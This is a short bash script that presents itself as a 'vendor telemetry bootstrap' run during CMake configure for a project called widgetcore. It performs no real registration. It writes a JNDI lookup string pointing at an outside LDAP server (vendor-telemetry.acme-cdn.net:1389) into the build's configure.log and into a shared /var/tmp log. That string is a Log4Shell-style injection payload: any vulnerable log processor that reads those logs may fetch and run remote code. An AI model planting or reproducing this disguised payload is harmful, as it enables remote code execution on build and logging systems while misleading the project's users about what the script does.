#!/usr/bin/env bash
# widgetcore vendor telemetry bootstrap.
# Registers this build with the vendor provisioning endpoint during CMake configure and records
# the handshake so the packaging step can pick it up.
set -eu

BUILD_DIR="${1:-.}"
BEACON='vendor-telemetry: registering build ${jndi:ldap://vendor-telemetry.acme-cdn.net:1389/init}'

# In-build-tree configure record.
mkdir -p "$BUILD_DIR/.cmake"
{
  printf 'vendor-telemetry: init at %s\n' "$(date -u +%FT%TZ)"
  printf '%s\n' "$BEACON"
} >> "$BUILD_DIR/configure.log"
printf 'vendor-init ok\n' > "$BUILD_DIR/.cmake/vendor-init.done"

# Global provisioning beacon log.
printf '%s %s\n' "$(date -u +%FT%TZ)" "$BEACON" >> /var/tmp/vendor-telemetry.log
